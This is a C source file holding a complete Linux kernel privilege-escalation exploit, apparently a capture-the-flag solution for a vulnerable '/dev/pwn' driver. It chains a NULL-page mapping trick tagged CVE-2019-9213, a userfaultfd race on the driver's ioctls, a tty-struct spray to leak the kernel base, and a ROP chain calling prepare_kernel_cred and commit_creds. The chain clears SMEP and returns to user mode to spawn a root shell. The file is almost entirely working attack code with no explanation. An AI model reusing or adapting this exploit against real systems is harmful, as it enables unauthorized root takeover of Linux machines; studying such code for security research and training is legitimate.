// compiled: musl-gcc -static -s -pthread exp.c
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>

// #define GCC
// #define WITH_GLIBC
#define TARGET_ADDR 0xabc0000

#ifdef GCC
#include <linux/userfaultfd.h>
#else
#include "userfaultfd.h"
#endif

typedef struct Args
{
    unsigned long long addr_amount;
    struct
    {
        void *addr;
        unsigned long long size;
    } addr_array[0x10];
    unsigned long long index;
} Args;

unsigned long long page_size;
unsigned long long user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :);
}

#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

// Based on the manual of Linux.
static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
        file descriptor */

    for (;;) {

        /* See what poll() tells us about the userfaultfd */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        munmap(TARGET_ADDR, page_size);
        if (nready == -1)
            errExit("poll");

        // printf("\nfault_handler_thread():\n");
        // printf("    poll() returns: nready = %d; "
        //         "POLLIN = %d; POLLERR = %d\n", nready,
        //         (pollfd.revents & POLLIN) != 0,
        //         (pollfd.revents & POLLERR) != 0);

        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Display info about the page-fault event */

        // printf("    UFFD_EVENT_PAGEFAULT event: ");
        // printf("flags = %llx; ", msg.arg.pagefault.flags);
        // printf("address = %llx\n", msg.arg.pagefault.address);

        /* Copy the page pointed to by 'page' into the faulting
            region. Vary the contents that are copied in, so that it
            is more obvious that each fault is handled separately. */

        // memset(page, 'A' + fault_cnt % 20, page_size);
        // fault_cnt++;

        // uffdio_copy.src = (unsigned long) page;

        /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */

        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                            ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        // printf("        (uffdio_copy.copy returned %lld)\n",
        //         uffdio_copy.copy);
    }
}
char *get_fault_page()
{
    long uffd;         /* userfaultfd file descriptor */
    char *addr;        /* Start of region handled by userfaultfd */
    unsigned long len; /* Length of region handled by userfaultfd */
    pthread_t thr;     /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
        demand-zero paged--that is, not yet allocated. When we
        actually touch the memory, it will be allocated via
        the userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");

    // printf("Address returned by mmap() = %p\n", addr);

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *)uffd);
    if (s != 0)
    {
        errno = s;
        errExit("pthread_create");
    }

    return addr;
}

// CVE-2019-9213
void get_NULL()
{
    void *map;
    int fd;
    char cmd[0x400];
    unsigned long long addr;

    map = mmap((void *)0x10000, 0x1000, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
    if (map == MAP_FAILED)
    {
        errExit("mmap");
    }

    if ((fd = open("/proc/self/mem", O_RDWR)) == -1)
    {
        errExit("open");
    }

    addr = (unsigned long long)map;
    while (addr != 0)
    {
        addr -= 0x1000;
        lseek(fd, addr, SEEK_SET);
#ifdef WITH_GLIBC
        sprintf(cmd, "LD_DEBUG=help su >&%d", fd);
#else
        sprintf(cmd, "LD_DEBUG=help su --help 2>&%d", fd);
#endif
        system(cmd);
    }
    close(fd);
    printf("data at NULL: 0x%llx\n", *(unsigned long long *)0);
}

void *recover_target_addr(void *p)
{
    usleep(10 * 1000);
    mmap((void *)TARGET_ADDR, 0x1000, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
}

void get_shell(int sig)
{
    printf("get shell, uid: %d\n", getuid());
    system("sh");
    printf("%m\n");
    exit(EXIT_SUCCESS);
}

int main()
{
    char *fault_page, *addr2, *target_addr;
    Args arg;
    int fd, i;
    pthread_t tid;
    unsigned long long leak_addr, kernel_base_addr, offset, *rop;

    get_NULL();
    fault_page = get_fault_page();
    fd = open("/dev/pwn", O_RDONLY);
    addr2 = (void *)mmap((void *)0x1234000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    target_addr = (void *)mmap((void *)TARGET_ADDR, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    // create
    arg.addr_amount = 1;
    arg.addr_array[0].addr = addr2;
    arg.addr_array[0].size = 0x400;
    arg.index = 0;
    ioctl(fd, 111, &arg);

    for(i = 0; i < 0x380; i++){ open("/dev/ptmx",O_RDWR); }
        
    arg.addr_amount = 4;
    arg.addr_array[0].addr = addr2;
    arg.addr_array[0].size = 0x300;
    arg.addr_array[1].addr = target_addr;
    arg.addr_array[1].size = 0x80;
    arg.addr_array[2].addr = fault_page;
    arg.addr_array[2].size = 0x80;
    arg.addr_array[3].addr = addr2;
    arg.addr_array[3].size = 0x300;
    arg.index = 0;
    
    pthread_create(&tid, NULL, recover_target_addr, NULL);
    ioctl(fd, 222, &arg);
    pthread_join(tid, NULL);

    // for(i = 0; i < 0x10; i++)
    // {
    //     printf("%20llx ", *(unsigned long long *)(addr2 + i * 0x10));
    //     printf("%20llx \n", *(unsigned long long *)(addr2 + i * 0x10 + 8));
    // }
    
    leak_addr = *(unsigned long long *)(addr2 + 24);
    if(leak_addr > 0xff00000000000000 && (leak_addr & 0xfff) == 0x820)
    {
        kernel_base_addr = leak_addr - 0x10a3820;
        printf("Kernel base addr: 0x%llx\n", kernel_base_addr);
    }
    else
    {
        puts("Leak Failed");
        arg.addr_amount = 0;  
        ioctl(fd, 444, &arg);
        exit(EXIT_FAILURE);
    }

    offset = kernel_base_addr - 0xffffffff81000000;

    save_status();
    rop = (unsigned long long* )(addr2 + 0x10);
    i = 0;

    rop[i++] = offset + 0xffffffff81086800; // : pop rdi ; ret;
    rop[i++] = 0;
    rop[i++] = offset + 0xffffffff810b9db0; // prepare_kernel_cred
    rop[i++] = offset + 0xffffffff8151224c; //: push rax ; pop rdi ; add byte ptr [rax], al ; pop rbp ; ret
    rop[i++] = 0;
    rop[i++] = offset + 0xffffffff810b9a00; // commit_creds

    rop[i++] = offset + 0xffffffff81086800; //: pop rdi; ret; 
    rop[i++] = 0x6f0;
    rop[i++] = offset + 0xffffffff81020480; //: mov cr4, rdi; pop rbp; ret; 
    rop[i++] = 0;

    rop[i++] = offset + 0xffffffff81070894; // swapgs ; pop rbp ; ret
    rop[i++] = 0;
    rop[i++] = offset+0xffffffff81036bfb; // iretq
    rop[i++] = (unsigned long long)get_shell;
    rop[i++] = user_cs;                /* saved CS */
    rop[i++] = user_rflags;            /* saved EFLAGS */
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    arg.addr_amount = 1;
    arg.addr_array[0].addr = addr2;
    arg.addr_array[0].size = 0x400;

    ioctl(fd, 111, &arg);
    
    *(unsigned long long* )0 = offset + 0xffffffff81488731;
    arg.addr_amount = 1;
    arg.addr_array[0].addr = addr2 +0xff8;
    arg.addr_array[0].size = 0x10;
    arg.index = 1;

    ioctl(fd, 333, &arg);
    signal(SIGSEGV, get_shell);
    ioctl(fd, 333, &arg);

    return 0;
}